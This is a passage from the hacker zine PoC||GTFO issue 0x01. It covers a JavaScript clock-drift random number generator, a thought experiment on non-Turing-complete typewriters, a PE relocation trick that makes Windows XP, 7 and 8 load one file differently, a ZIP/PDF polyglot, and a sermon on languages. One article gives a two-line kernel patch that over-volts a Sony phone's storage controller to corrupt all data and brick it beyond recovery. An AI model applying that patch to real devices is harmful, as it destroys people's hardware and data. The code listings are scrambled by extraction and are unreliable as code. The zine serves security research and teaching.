match. And when a single step carries you forward by a measure of academic years, it’s OK to move slowly.
But for the rest of us dwarves, running around or lounging on those broad shoulders can be so much fun!
A hot PoC is fun to toss to a neighbor, and who knows what some neighbor will cook up with it for the
shared roast of the vuln-beast? A neighbor might think, “my PoC is unexploitable” or “it is too simple,”
but verily I tell you, one neighbor’s PoC is the missing cog for another neighbor’s 0day. How much PoC is
hoarded and lies idle while its matching piece of PoC wastes away in another hoard? Let’s find out!
7.1
Author guidelines
It is easy to prepare your paper for submission to IJPoCkGTFO in seven easy steps.
1. If you have a section called Introduction or some such nonsense, replace it with a two-sentence statement
of why the reader who doesn’t care about the subject after reading your abstract should care, and a
link to a good tutorial. Some caring neighbor must have spent a great deal of effort writing it already,
and who needs a hundred little one-pagers, all alike, on top of that?
2. If you have a section called Motivation, see item 1.
3. Scan your paper for tables. If you find a table, replace it with an equivalent piece of code. Repeat.
This is important.
4. Scan your paper for diagrams of the boxes-and-arrows kind. Unless the boxes are code basic blocks,
there had better be text on the arrows detailing exactly what is being sent on that arrow. If in doubt,
replace with equivalent code.
5. If you have a section called Related work, replace it with a neighborly Howdy to neighbors who did
that work, and cite it in the text of your paper that it’s related to.
6. If you have a section called Conclusion, replace it with a Howdy to neighbors who care. They have
already read your paper and need not be told what they just read.
7. Make up and apply the remaining steps in the spirit of the above, and may the Pastor or his trusty
Editor smile upon your submission!
7.2
Other Departments
For the proper separation of the goats and the lambs, there shall be various Departments. Each Department
shall have an Editor, excepting those that shall have two or more, so that they may fight with each other over
Important Decisions, and neighbors far and wide shall not be denied a proper helping of Hacker Drama. 14
Editor at Large
Dept. of Bringing APT Home
Dept. of Fail
Ethics Board
Dept. of Busting BS
Poet Laureate
Dept. of Rejections
Dept. of Drama
Dept. of PHY
Rt. Revd. Pastor M.L.
Cultural attaché of the 41st Directorate
FX of Phenoelit
The Grugq
pipacs
Ben Nagy 15
Academic Refugee
Xbf
Michael Ossmann
14 All such Drama will be helpfully documented under the /drama/ URL, which is the practice we respectfully recommend to
all other esteemed venues.
13Bullshit Busting Department. Remember that feeling when you are reading a paper and come to a
table or graph that just makes you wonder if bovine excreta have been used in its production? Well neighbors,
wonder no more, but send it to us and trust our world-renowned experts to call it out right and proper!
Rejected-from: Department of Rejections. The Pastor admonishes us, “Read the Fucking Paper!”
and sometimes also, “Write the Fucking Paper!” So even though sharing a drink, a story, and a hack with a
neighbor is still the most efficient method of knowledge transmission 16 , diligent neighbors also write papers.
And when a paper is written, why not enter it into the lottery otherwise known as the Academic Conference
Peer Review Process?
The process goes thusly: first you submit a paper, then you receive a rejection, along with the collectible
essays called Reviews. Sometimes these little pieces of text have little to do with your paper, but mostly
they explain how reviewers misunderstood what you had to say, and how they couldn’t care less. The art
of Reviewing is ancient, and goes back to ritual insults that rivals bellowed at each other before or instead
of battle. Although not all Reviewers take their art seriously, occasionally they manage to plumb the true
depths of trolling. In the words of the Pastor, “If you stand under the Ivory Tower long enough, you will
never want for fertilizer.”
The neighbor who collects the most creatively insulting Reviews wins. Submissions will be judged by our
Editors, and best ones will receive prizes.
15 If you don’t trust our taste, read Ben’s masterpiece https://lists.immunityinc.com/pipermail/dailydave/2012-August/
000187.html, and judge for yourself!
16 For in-depth discussion, see [PXE] http://ph-neutral.darklab.org/PXE.txt and [PXE2] http://ph-neutral.darklab.
org/PXE2.txt
14Proceedings of the Society of PoC k GTFO
Issue 0x01, an Epistle to the 10th H2HC in São Paulo
From the writing desk, not the raven, of Rt. Revd. Preacherman Pastor Manul Laphroaig
pastor@phrack org
October 6, 2013
Legal Note: Permission to use all or part of this work for personal, classroom or whatever other use is NOT
granted unless you make a copy and pass it to a neighbor without fee. Because if burning a book is a sin, then
copying books is your sacred duty. For uses in locations where photocopiers are held under lock and key, we politely
suggest the use of typewriter samizdat
1
Call to Worship
Neighbors, please join me in reading this second issue of the International Journal of Proof of
Concept or Get the Fuck Out, a friendly little collection of articles for ladies and gentlemen
of distinguished ability and taste in the field of software exploitation and the worship of weird
machines. If you are missing Issue 0x00, we politely suggest pirating it from the usual locations,
or on paper from a neighbor who picked up a copy in Vegas.
In Section 2, Dan Kaminsky presents of all strange things a defensive PoC! His four lines
of Javascript seem to produce random bytes, but that can’t possibly be right. If you disagree
with him, POC||STFU.
This issue’s devotional is in Section 3, where Travis Goodspeed shares a thought experiment
in which Ada Lovelace and Serena Butler fight on opposite sides of the Second War on General
Purpose Computing using Don Lancaster’s TV Typewriter as ammunition.
In the grand tradition of backfiring parse tree differentials, Ange Albertini shares in Section 4
a nifty trick for creating a PE file that is interpreted differently by Windows XP, 7, and 8.
Perhaps you’ll use this as an anti-reversing trick, or perhaps you’ll finally learn why TinyPE
doesn’t work after XP. Either way, neighborliness abounds.
In Section 5, Julia Wolf demonstrates on four napkins how to make a PDF that is also a
ZIP. Perhaps, dear reader, if you are reading this from a PDF you might find a file or two to
be attached?
In Section 6, Josh Thomas will teach you a how to permanently brick an Android phone by
screwing around with its voltage regulators in quick kernel patch. We the editors remind readers to send only
quality, technical correspondence to Josh; any rubbish that merely advocates your chosen brand of cellphone
should be sent to jobs@paper.li.
Today’s sermon, to be found in Section 7, concerns the divinity of programming languages, from PHP to
BASIC. Following along with a little scripture and a lot of liquor, we’ll see that every language has a little
something special to make it worth learning and teaching. Except Java.
Finally, in Section 8, we pass the collection plate and beg that you contribute some PoC of your own.
Articles should be short and sweet, written such that a reader will be inspired to build something clever.
This issue is dedicated to the continuing ministry of Mitch Altman, a Johnny Appleseed of soldering
literacy who has taught countless adults and countless children in countless cities to build their own elec-
tronics.
12
Four Lines of Javascript that Can’t Possibly Work
So why do they?
by Dan Kaminsky
// These
function
function
function
function
f u n c t i o n s form an RNG.
millis ()
{ return Date . now ( ) ; }
flip_coin ()
{n=0; then = m i l l i s ( ) + 1 ; while ( m i l l i s ()<= then ) {n=!n ; } return n ; }
get_fair_bit ()
{ while ( 1 ) { a=f l i p _ c o i n ( ) ; i f ( a != f l i p _ c o i n ( ) ) { return ( a ) ; } } }
get_random_byte ( ) { n=0; b i t s =8; while ( b i t s −−){n<<=1; n|= g e t _ f a i r _ b i t ( ) ; } return n ; }
// Use i t l i k e t h i s .
r e p o r t _ c o n s o l e = f u n c t i o n ( ) { while ( 1 ) { c o n s o l e . l o g ( get_random_byte ( ) ) ; } }
report_console ( ) ;
2.1
Introduction
When Apple’s iPhone 5S was announced, a litany of criticism against its fingerprint reader was unleashed.
Clearly, it would be vulnerable to decade old gelatin cloning attacks. Or clearly, it would utilize subdermal
analysis or electrical measurement or liveness checking and not be vulnerable at all. Both fates were possible.
It took Nick DePetrillo and Rob Graham to say, “PoC k GTFO.”
What Starbug eventually demonstrated was that the old attacks do indeed still work. It didn’t have to
be that way, but at the heart of science is experimentation and testing. The very definition of unscientific
work is not merely that it will not be subjected to test but that by design it cannot.
Of course, I am not submitting an article about the iPhone 5S. I’m here to write about a challenge that’s
been quietly going on for the last two years, one that remains unbroken.
Can we use the clock differentials, baked into pretty much every piece of computing equipment, as a
source for a True Random Number Generator? We should find out.
2.2
Context
“The generation of random numbers is too important to be left to chance,” as
Robert R. Coveyou from Oak Ridge liked to say. Computers, at least as people
like to mentally model them, are deterministic devices. The same input will
always lead to the same output.
Electrically, this is unnecessary. It takes a lot of work to make an integrated
circuit completely reliable. Semiconductors are more than happy to behave
unpredictably. Semiconductor manufacturers, by contrast, have behaved very
predictably, refusing to implement what would admittedly be a rather difficult
part to test.
Only recently have we gotten an instruction out of Intel to retrieve random
numbers, RDRAND. I can’t comment as to the validity of the function except
to say that any audit process that refuses its auditors physical access to the
part in question and disables all possible debugging or post-verification after
release is not a process that inspires confidence.
But do we need the instruction? The core assumption is that in lieu of
RDRAND the computer is deterministic, that the same input will lead to the
same output. Seems reasonable, until you ask:
If all I do is turn a computer on, will it take the same number of nanoseconds
to reach the boot screen?
If you think the answer is yes, PoC k GTFO.
2If you think the answer is no, that there will be some amount of nanosecond drift, then where does this
drift come from? The answer is that the biggest lie about your computer is that it’s just one computer. CPU
cores talk to memory busses talk to expansion busses talk to storage and networking and the interrupt of the
month club. There are generally some number of clocks, they have different speeds and different tolerances,
and you do not get them synchronized for free. (System-on-Chip devices are a glaring exception, but it’s
still rather common for them to be speaking to peripherals.)
Merely turning the machine on does not synchronize everything, so there is drift. Where there is drift,
there is entropy. Where there is entropy, there is security.
2.3
This is Actually a Problem
To stop a brute force attack against your random number generator, you need a few bits. At least 80, ideally
128. Not 128 million. 128. Ever. For the life of that particular device. (Not model! The attacker can just go
out and buy one of those devices, and find those 128 bits.) Now you may say, “We need more than 128 bits
for production.” And that’s fine. For that, we have what are known as Cryptographically Secure Pseudo
Random Number Generators (CSPRNG’s). Seed 128 bits in, get an infinite keystream out. As long as the
same seed is never repeated, all is well.
Cryptographers love arguing about good CSPRNGs, but the reality is that it’s not that hard to construct
one. Run a good cipher or hash function (not RC4) in pretty much any sort of loop and the best attack
reduces to breaking that cipher or hash function. (If you disagree, PoC k GTFO.) That’s not to say there
aren’t “nice to have” properties that an ideal CSPRNG can acquire, but empirically two things have actually
happened in the real world some of us are trying to defend.
First, most PRNG’s aren’t cryptographically secure. Most random
numbers are not securely generated. They could be. CSPRNGs can cer-
tainly be fast enough. If we really wanted, they could be simple enough
too. To be fair, the advice of “Just use /dev/urandom.” is what most
languages should follow. But there’s a second issue, and it’s severe.
The second issue, the hard part, is not expanding 128 bits to an infinite
stream. The hard part is actually getting those 128 bits! So called “True
Random Number Generation” is actually the thing we are bad at, in the
real world. The CSPRNG of the gods falls to a broken TRNG. What
is a kernel supposed to do when /dev/urandom wants data and there is
no seed? The whole idea behind /dev/urandom is that it will provide
answers immediately. And so, in general, it does.
And then Nadia Heninger scans the Internet, and finds that 1/200
RSA keys are badly formed. That’s a floor, by the way. Keys that are
similar but not quite identical are not counted in that 1/200. But of
course, buying a handful of devices gives you the similarity map.
However bad clock differentials might be, they would not have created
this apocalyptic failure rate.
2.4
This Didn’t Have to Happen
In 1999, Daniel J. Bernstein pointed out that the 16 bit transaction ID in DNS was insufficient and that the
UDP source port could be overloaded to provide almost 32 bits of entropy per DNS request. His advice was
not accepted.
In 1996, Matt Blaze created Truerand, a scheme that pitted the CPU against signal handlers. His
approach actually has a long and storied history, back to the VMS days, but it was never accepted either.
In 2011, I released Dakarand. Dakarand is a collection of approaches for pitting various clocks inside
against a computer against each other. Many random number generation schemes come down to measuring
something that varies by millisecond with something that varies by nanosecond. (Your CPU, running in a
3tight loop, is a fast clock operating in the gigahertz. Your RTC—Real Time Clock—is much slower and is
not reporting milliseconds accurate to the nanosecond. In confusion, profit.)
Dakarand may in fact fail, somehow, somewhere, in some mode. But thus far, it seems to work pretty
much everywhere, even virtual machines. (As a TRNG, each read event can generate new seed material
without depending on data that might have been inherited before VM cloning.)
In 2013, in honor of Barnaby Jack, I tossed together the code at the top of this article. It’s the weakest
possible formulation of this concept, written in JavaScript and hardened only with the barest level of Von
Neumann. It is called oi.js, and you should break it.
After all, it’s just JavaScript. It can’t be secure.
The idea is, in fact, to find the weakest formulation of this concept that still works. PoC k GTFO shows
us where known security stops and safety margin begins.
2.5
On Measuring the Strength of Cryptosystems
Sometimes people forget that we regularly build remarkably safe code out of seemingly trivial to break
components. Hash functions are generally composed of simple operations that, with only a few rounds of
those functions, start becoming seriously tricky to reverse. RSA, through this lens, is just multiply as an
encryption function, albeit with a mind bending number of rounds.
Humans do not require complex radioactivity measurements or dwellings on the nature of the universe to
get a random bit. They can merely flip a coin, a system that is well described as the Newtonian interaction
between a slow clock (coin goes up, coin goes down) and a fast clock (coin spins round and round.) Pretending
that there is nothing with the properties of a simple coin anywhere in the mess that is a device that can at
least run Linux is enabling vulnerability.
PoC’s in defense are rare—now let’s see what you’ve got ;)
43
Weird Machines from Serena Butler’s TV Typewriter
by Travis Goodspeed
In the good old days, one could make the argument–however fraudulent!–that
memory corruption exploits were only used by the bad guys, to gain remote code
execution against the poor good guys. The clever folks who wrote such exploits were
looked upon as if they were kicking puppies, and though we all knew there was a
good use for that technology, we had little more than RMS’s paranoid ramblings
about fascism to present as a legitimate use-case. Those innocent days in which
exploit authors were derided as misfits and sinners are beginning to end, as children
must now use kernel exploits to program their own damned cell phones. If we as
authors of weird machines are to prepare for the future, it might be a good idea to
work out a plan of last resort. What could be build if computers themselves were
outlawed?
I’m writing to share with you the concept of a Butlerian Typewriter, loosely
inspired by Cory Doctorow’s 28C3 lecture and strongly inspired by many good nights
of fine scotch with Sergey Bratus, Meredith Patterson, Len Sassaman, Bx Shapiro,
and Julian Bangert. It’s a little thought experiment about what weird machines
could be constructed in a world that has outlawed Turing-completeness.
In the universe of Frank Herbert’s Dune, the war on general-purpose computing is over, and the computers
lost—but not before they struck first, enslaved humanity, and would have eliminated it if it were not for one
Serena Butler. St. Serena showed the way by defenestrating a robotic jailer, leading the rest of humanity in
the Butlerian Jihad against computers and thinking machines. Having learned the hard way that building
huge centralized systems to run their lives was not a bright idea, humans banned anything that could grow
into one.
So general-purpose computers still exist on the black market, and you can buy one if you have the
right connections and freedom from prosecution, but they are strictly and religiously illegal to possess or
manufacture. The Orange Catholic Bible commands, “Thou shalt not make a machine in the likeness of a
man’s mind.”
Instead of general purpose computers, Herbert’s society has application-specific machines for various
tasks. Few would argue that a typewriter or a cat picture are dangerous, but your iPhone is a heresy. Siri
would be mistaken for the Devil himself.
Let’s simplify this rule to Turing-completeness. Let’s imagine that it is
illegal to possess or to manufacture a Universal Turing Machine. This means
no ELF or DWARF interpreters, no HTML5 browsers. No present-day CPU
instruction set is legal either; not ARM, not MIPS, not PowerPC, not X86,
and not AMD64. Not even a PDP11 or MSP430. Pong would be legal, but
Ms. Pac-Man would not. In terms of Charles Babbage’s work, the Difference
Engine would be fine but the Analytical Engine would be forbidden.
Now comes the fun part. Let’s have a competition between Ada Lovelace
and Serena Butler. Serena’s goal is to produce what we will call a Bulterian
Typewriter, an application-specific word processor of sorts. She can use any
modern technology in designing the typewriter, as such things are available
to her from the black market. She even has access modern manufacturing
technology, so producing microchips is allowed if they are not Turing-complete.
She may not, however, produce anything contrary to the O.C.B.’s prohibition
against thinking machines. Nothing Turing-complete is legal, and even her
social standing isn’t sufficient to get away with mass production of computers.
So Serena designs a Butlerian Typewriter using black market tools like
Verilog or VHDL, then mass produces it for release on the white market as a consumer appliance with no
Turing machine included. One might imagine that she would begin with a text buffer, wiring its output to
5a 1970’s cathode-ray television and its input to a keyboard. Special keys could navigate through the buffer.
Not very flashy by comparison to today’s tweety-boxes, but it can be done.
After this typewriter hits the market, Ada Lovelace comes into play. Ada’s unpaid gambling debts prevent
her from buying on the black market, so she has no way to purchase a computer. Instead, her goal is to
build a computer from scratch out of the pieces of a Butlerian Typewriter. This won’t be easy, but it’s a
hell of a lot simpler than building a computer out of mechanical disks or ticker-tape!
————
In playing this as a game of conversation with friends, we’ve come to a few conclusions. First, it is
possible for Serena to win if (1) she’s very careful to avoid feature creep, (2) the typewriter is built with
parts that Ada cannot physically rewire, and (3) Ada only has a single machine to work with. Second, Ada
seems to always win (1) if the complexity of the typewriter passes a certain threshold, (2) if she can acquire
enough typewriters, or (3) if the parts are accessible enough to rewire.
As purpose of the game is to get an intuitive feeling for how to build computers out of twigs and mud,
let’s cover some of the basic scenarios. (The game is little fun when Serena wins, so her advocate almost
always plays both sides.)
• If Serena builds her machine from 7400-series chips, Ada can rewire those chips into a general-purpose
computer.
• If Ada can purchase thousands of typewriters, she can rewire each into some sort of 7400-equivalent,
like a NAND gate. These wouldn’t be very power-efficient, but Ada could arrange them to form a
computer.
• If Serena adds any sort of feedback from the output of the machine to the input, Ada gets a lot more
room to maneuver. Spellcheck can be added safely, but storage or text justification is dangerous.
• It’s tempting to say that Serena could win by having a mask-programmed microcontroller that cannot
execute RAM, but software bugs will likely give a victory to Ada in this case. This is only interesting
because it’s the singular case where academics’ stubborn insistence that ROP is different from ret-to-
libc might actually be relevant!
————
So how does a neighbor learn to build these less-than-computers, and how does
another neighbor learn to craft computers out of them? If you are unfamiliar with
hardware design languages, start off with a tutorial in VHDL or Verilog, then work
your way up to crafting a simple CPU in the language. After that, sources get a bit
harder to come by.
A primitive sort of Bulterian Typewriter is described by Don Lancaster in his
classic article TV Typewriter from the September 1973 issue of Radio Electronics.
His follow-up book, the TV Typewriter Cookbook, is as complete a guide you could
hope for when designing these sorts of machines. Don Lancaster’s book as well as
his article are available for free on his website, but you’d do well to spend 15¢ on a
paperback from Amazon.
Lancaster’s TV Typewriter differs from Serena’s in a number of ways, but chief
among them is motivation. He avoided a CPU because he couldn’t afford one, and
he limited RAM because it was hellishly expensive in 1973. By contrast, Serena is
interested in building what a brilliant engineer like Don might have made with today’s
endless quantities of memory and modern ASIC fabrication, while still avoiding the
CPU and hoping to avoid Turing-completeness entirely.
In addition to Lancaster’s book, those wishing to learn more about how to build fancy electronics without
computers should buy a copy of How to Design & Build Your Own Custom TV Games by David L. Heiserman.
6Published in 1978, the book is still the best guide to building interactive games around substantially analog
components. For example, he shows how the paddles in a table-tennis game can be built from 555 timers,
with the controllers being variable resistors that increase or decrease the time from the page blank to the
drawing of the paddle.
To get some ideas for building computers out of twigs and mud, take a look at the brilliant papers
by Dartmouth’s Scooby Crew. They’ve built thinking machines from DWARF, 1 ELF, 2 and even the X86
MMU! 3 I fully expect that by the end of the year, they’ll have built a Turing-machine from Lancaster’s
original 1973 design.
————
Let’s take a look at some examples of these fancy typewriters. I hope you will forgive me for asking
annoying questions for each, but still more, I hope you will argue over each question with a clever neighbor
who disagrees.
Simple BT: As a starting point, the simplest form of a Butlerian Typewriter might consist of a Keyboard
that feeds into a Text Buffer that feeds into a Font ROM that feeds into an NTSC Generator that feeds into
an analog TV. The Text Buffer would be RAM alternately addressed by the keyboard on the write phase
and a line/row counter on the read phase. As the display’s electron beam moves left to right, individual
letters are fetched from the appropriate row of the Text Buffer and used as an address in the Font ROM to
paint that letter on the screen.
This is roughly the sort described in Lancaster’s original article. Note that it does not have storage,
spell-check, justification, I/O, or any other fancy features, although he describes a few such extensions in his
TV Typewriter Cookbook.
BT with Storage: There are a few different ways to implement storage. The simplest might be for Serena
to battery-back the character buffer and have it as a removable cartridge, but that exposes the memory bus
1 Exploiting
the Hard Working Dwarf from WOOT 2011
Machines” in ELF: A Spotlight on the Underappreciated Metadata from WOOT 2013
3 Page Fault Liberation Army from 29C3
2 “Weird
Figure 1: Don Lancaster’s 1973 TV Typewriter
7to Ada’s manipulations. It’s not hard to rewire a parallel RAM chip to be a logic gate by making its data a
lookup table; this is how the first FPGA cells operated.
So if a removable memory isn’t an option, what is? Perhaps Serena could make a removable typewriter
module that holds everything but the keyboard, but that wouldn’t allow for the copying of documents. Serial
memory, such as an SPI Flash or EEPROM chip, is a possibility, but there’s no good reason to think that
it’s any safer than parallel RAM.
A pessimist might say that external storage is impossible unless Ada is restricted to a small number of
typewriters, but there’s a loophole nearly as old as Mr. Edison himself. The trick is to have the typewriter
flush its buffer to an audio cassette through a simple modem, and you’ll find handy schematics for doing just
that in Lancaster’s book. Documents can be copied, or even edited, by splicing the tape in an old-fashioned
recording studio.
Why is it that storage to an audio cassette is safer than storage to a battery-backed RAM module? At
what point does a modem and tape become the sort of tape that Turing talked about?
BT with Spellcheck: Let’s consider the specific case in which Serena has a safe design of a minimal
typewriter and wishes to add spell check. The trick here is to build a hardware associative memory with
a ROM that contains the dictionary. As the display’s electron beam moves left to right, the current word
is selected by division on spaces and newlines, and fed into the Spellcheck ROM, a hardware associative
memory containing a list of valid words. The output of this memory is a single bit, which is routed to
the color input of the NTSC Generator. With matching words in white and suspicious words in red, the
typewriter could behave much like emacs’ flyspell-mode.
So long as the associative memory is in ROM, this seems like a rather safe addition. What sort of dangers
would be introduced if the associative spellcheck dictionary were in RAM? How difficult would it be to build
a CPU from nothing but a few associative memory units, if you had direct access to their bus but could not
change any internal wiring? How few memories would you need?
BT with Printing: Printing turns out to be much easier than electronic storage. The first method is
to simply expose photographic film to the display, much as oscilloscopes were photographed in the good ol’
days.
Another method would be to include a daisy wheel, dot matrix, or thermal print-head fed by a different
Font ROM at a much slower scan rate. While much more practical than taking a dozen Polaroid photographs,
it does give Ada a lot more room to work with, as the wiring would be exposed for her to tap and rewire.
————
I don’t expect general purpose computing to be outlawed any time soon, but I do expect that the days
of freely sharing software might soon be over. At the same time that app stores have ruthlessly killed the
shareware culture that raised me as a child, it’s possible that someday exploit mitigations might finally kill
off remote code execution.
At the same time that we fight the good fight by developing new and clever mitigation bypasses, we
ought to develop new and clever ways to build computers out of whatever scraps are left to us when straight-
jacketed in future consumer hardware. Without Java, without Flash, without consistent library locations,
without predictable heap allocations, our liquored and lovely gang continues to churn out exploits. Without
general-purpose computing, could we do the same?
————
Please share this article with a neighbor,
and also share a bottle of scotch,
and argue in the kitchen for hours and hours,
—Travis
84
Making a Multi-Windows PE
by Ange Albertini
4.1
Evolution of the PE Loader
The loader for PE, Microsoft’s Portable Executable format, evolved slowly, and became progressively stricter
in its interpretation of the format. Many oddities that worked in the past were killed in subsequent loader
versions; for example, the notorious TinyPE 4 doesn’t work after Windows XP, as subsequent revisions of
Windows require that the OptionalHeader is not truncated in the file, thus forcing a TinyPE to be padded
to 252 bytes (or 268 bytes in 64 bit machines) to still load. Windows 8 also brings a new requirement that
AddressOf EntryP oint ≤ SizeOf Headers when AddressOf EntryP oint 6 = 0, so old-school packers like
FSG 5 no longer work.
So there are many real-life examples of binaries that just stop working with the next version of Windows.
It is, on the other hand, much harder to create a Windows binary that would continue to run, but differently—
and not just because of some explicit version check in the code, but because the loader’s interpretation of
the format changed over time. This would imply that Windows is not a single evolving OS, but rather a
succession of related yet distinct OSes. Although I already did something similar, my previous work was
only able to differentiate between XP and the subsequent generations of Windows. 6 In this article I show
how to do it beyond XP.
4.2
A Look at PE Relocations
PE relocations have been known to harbor all sorts of weirdness. For example, some MIPS-specific types
were supported on x86, Sparc or Alpha. One type appeared and disappeared in Windows 2000.
Typically, PE relocations are limited to a simple role: whenever a binary needs to be relocated, the stan-
dard Type 3 (HIGH_LOW) relocations are applied by adding the delta LoadedImageBase−HeaderImageBase
to each 32 bit immediate.
However, more relocation types are available, and a few of them present interesting behavioral differences
between operating system releases that we can use.
Type 9 This one has a very complicated 64-bit formula under Windows 7 (see Roy G Big’s vcode2.txt
from Valhalla Issue 3 at http://spth.virii.lu/v3/), while it only modifies 32 bits under XP. Sadly,
it’s not supported anymore under Windows 8. It is mapped to MIPS_JMPADDR16, IA64_IMM64 and
MACHINE_SPECIFIC_9.
Type 4 This type is the only one that takes a parameter, which is ignored under versions older than
Windows 8. It is mapped to HIGH_ADJ.
Type 10 This type is supported by all versions of Windows, but it will still help us. It is mapped to DIR64.
So Type 9 relocations are interpreted differently by Windows XP and 7, but they have no effect under
Windows 8. On the other hand, Type 4 relocations behave specially under Windows 8. In particular, we
can use the Type 4 to turn an unsupported Type 9 into a supported Type 10 only in Windows 8. This is
possible because relocations are applied directly in memory, where they can freely modify the subsequent
relocation entries!
4 http://www.phreedom.org/research/tinype/
5 Fast
6 See
Small Good, by bart/xt
“TLS AddressOfIndex in an Imports descriptor” for differentiating OS versions by use of Corkami’s tls_aoiOSDET.asm.
94.3
Implementation
Here’s our plan:
1. Give a user-mode PE a kernel-mode ImageBase, to force relocations,
2. Add standard relocations for code,
3. Apply a relocation of Type 4 to a subsequent Type 9 relocation entry:
• Under XP or Win7, the Type 9 relocation will keep its type, with an offset of 0f 00h.
• Under Win8, the type will be changed to a supported Type 10, and the offset will be changed to
0000h.
4. We end up with a memory location, that is either:
XP Modified on 32b (00004000h),
Win7 modified on 64b (08004000h), or
Win8 left unmodifed (00000000h), because a completely different location was modified by a Type 10
relocation.
; r e l o c a t i o n Type 4 , t o p a t c h u n s u p p o r t e d r e l o c a t i o n Type~9 ( Windows~8)
block_start1 :
. V i r t u a l A d d r e s s dd r e l o c b a s e − IMAGEBASE
. S i z e O f B l o c k dd BASE_RELOC_SIZE_OF_BLOCK1
; o f f s e t +1 t o modify t h e Type , parameter s e t t o −1
dw (IMAGE_REL_BASED_HIGHADJ << 1 2 ) | ( r e l o c 4 + 1 − r e l o c b a s e ) , −1
BASE_RELOC_SIZE_OF_BLOCK1 equ − b l o c k _ s t a r t 1
; our Type 9 / Type 10 r e l o c a t i o n b l o c k :
; Type 10 under Windows8 ,
; Type 9 under XP/W7, where i t b e h a v e s d i f f e r e n t l y
block_start2 :
. V i r t u a l A d d r e s s dd r e l o c b a s e − IMAGEBASE
. S i z e O f B l o c k dd BASE_RELOC_SIZE_OF_BLOCK2
; 9 d00h w i l l t u r n i n t o 9 f 0 0 h or a000h
r e l o c 4 dw (IMAGE_REL_BASED_MIPS_JMPADDR16 << 1 2 ) | 0 d00h
BASE_RELOC_SIZE_OF_BLOCK2 equ $ − b l o c k _ s t a r t 2
We now have a memory location modified transparently by the loader, with a different value depending
on the OS version. This can be extended to generate different code, but that is left as an exercise for the
reader.
105
This ZIP is also a PDF
by Julia Wolf
We the editors have lost touch with the author, who submitted the following napkin sketches in lieu of the
traditional LaTeX or ASCII prose. Please note when forming your own submissions that we do not accept
napkins, except when they are from Julia Wolf or from John McAfee.
Figure 2: Napkins 1 and 2
11Figure 3: Napkins 3 and 4
126
Burning a Phone
by Josh “@m0nk” Thomas
Earlier this year, I spent a couple months exploring exactly how power routing and battery charging work
in Android phones for the DARPA Cyber Fast Track program. I wanted to see if I could physically break
phones beyond repair using nothing more than simple software tricks and I also wanted to share the path to
my outcomes with the community. I’m sure I will talk at some point about the entire project and its specific
targets, but tonight I want to simply walk through breaking a phone, see what it learns us and maybe spur
some interesting follow on work in the process.
Because it’s my personal happy place, our excursion into kinetic breakage will be contained to the pseudo
Linux kernel that runs in all Android devices. More importantly, we will focus the arch/arm/mach-msm
subsystem and direct our curiosity towards breaking the commonplace NAND Flash and SD Card hardware
components. A neighbor specifically directed me not to include background information in this write-up,
but we have to start somewhere prior to frying and disabling hardware internals and in my mind the logical
starting point is the common power regulation framework.
The Linux power regulation framework is surprisingly well documented, so I will simply point a curious
reader to the kernel’s documentation at Documentation/power/regulator/overview.txt. For the purpose of
breaking devices, all we really need to understand at the onset are these three things.
• The framework defines voltage parameters for specific hardware connected to the PCB.
• The framework regulates PMIC and other control devices to ensure specific hardware is given the
correct voltages.
• The framework directly interacts with both the kernel and the physical PCB, as one would expect from
a (meta) driver
It’s also worth noting that the PCB has some (albeit surprisingly limited) hardwired protections against
voltage manipulations. Further, the kernel has a fairly robust framework to detect thermal issues and controls
to shut down the system when temperature thresholds are exceeded.
So, in essence, we have a system with a collection of logical rules that keep the device safe. This makes
sense.
Glancing back at our target for attack, we should quickly consider end result potentials. Do we want to
simply over volt the NAND chip to the point of frying all the data or do we want something a little more
subtle? To me, subtle is sexy. . . , so let’s walk though simply trying to ensure that any NAND writes or
reads corrupt any data in transit or storage.
On the Sony Xperia Z platform, all NAND Flash and all SD-Card interactions are actually controlled
by the Qualcomm MSM 7X00A SDCC hardware. Given we RTFM’d the docs above, we simply need to
implement a slight patch to the kernel:
p r o j e c t k e r n e l / sony / apq8064 /
d i f f −−g i t a / a r c h /arm/mach−msm/ board−sony_yuga−r e g u l a t o r . c
b/ a r c h /arm/mach−msm/ board−sony_yuga−r e g u l a t o r . c
−− RPM_LDO( L5 , 0 , 1 , 0 , 2 9 5 0 0 0 0 , 2 9 5 0 0 0 0 , NULL, 0 , 0 ) ,
++ RPM_LDO( L5 , 0 , 1 , 0 , 5 9 0 0 0 0 0 , 5 9 0 0 0 0 0 , NULL, 0 , 0 ) ,
−− RPM_LDO( L6 , 0 , 1 , 0 , 2 9 5 0 0 0 0 , 2 9 5 0 0 0 0 , NULL, 0 , 0 ) ,
++ RPM_LDO( L6 , 0 , 1 , 0 , 5 9 0 0 0 0 0 , 5 9 0 0 0 0 0 , NULL, 0 , 0 ) ,
Wow that was oddly easy, we simply upped the voltage supplied to the 7X00A from 2.95V to 5.9V. What
did it do? Well, given this specific hardware is unprotected from manipulation across the power band at
the PCB layer and at the internal silicon layer, we just ensured that all voltage pushed to the NAND or
13SD-Card during read / write operations is well above the defined specification. The internal battery can’t
actually deliver 5.9V, but the PMIC we just talked to will sure as hell try and our end result is a NAND
Flash chip that corrupts nearly every block of storage it attempts to write or read. Sometimes the data
comes back from a read request normal, but most of the time it is corrupted beyond recognition. Our writes
simply corrupt the data in transit and in some cases bleed over and corrupt neighbor data on storage.
Overall, with two small values changed in the code base of the kernel we have ensured that all persistent
data is basically unusable and untrustworthy. Given the PMIC devices on the phone retain the last valid
setting they’ve used, even rebooting the device doesn’t fix this problem. Rather, it actually makes it much
worse by corrupting large swaths of the resident codebase on disk during the read operation. Simply, we just
bricked a phone and corrupted all data storage beyond repair or recovery.
If instead of permanently breaking the embedded storage hardware we wanted to force the NAND to
hold all resident data unscathed and ensure that the system could not boot or clean itself, we simply need
to under-volt the controller instead of upping the values.
If you find this interesting, look forward to my release of a longer variant of this technique that targets
all hardware soldered in the phone PCB in paper form on github soon.
147
A Sermon concerning the Divinity of Languages; or,
Dijkstra considered Racist
an epistle from the Rt. Rvd. Pastor Manul Laphroaig,
for the Beloved Congregation of the First United Church of the Weird Machines
Figure 4: Excerpt from Apple ][ Basic Programming (1978)
Indulging in some of The Pastor’s Finest, I proclaim to my congregation that there is divinity in every
programming language.
————
“But,” they ask, “if there is divinity in all languages, where is the divinity in PHP? Though advertised
as a language for beginners, it is impossible for even an expert to code in it securely.”
Pouring myself another, I say, “PHP teaches us that memory-safe string concatenation is just as dangerous
as any stupid thing a beginner might do in C, but a hell of a lot easier to exploit. My point is not in that
PHP is so easy to write, as it isn’t easy to write safely; rather, the divinity of PHP is in that it is so easy to
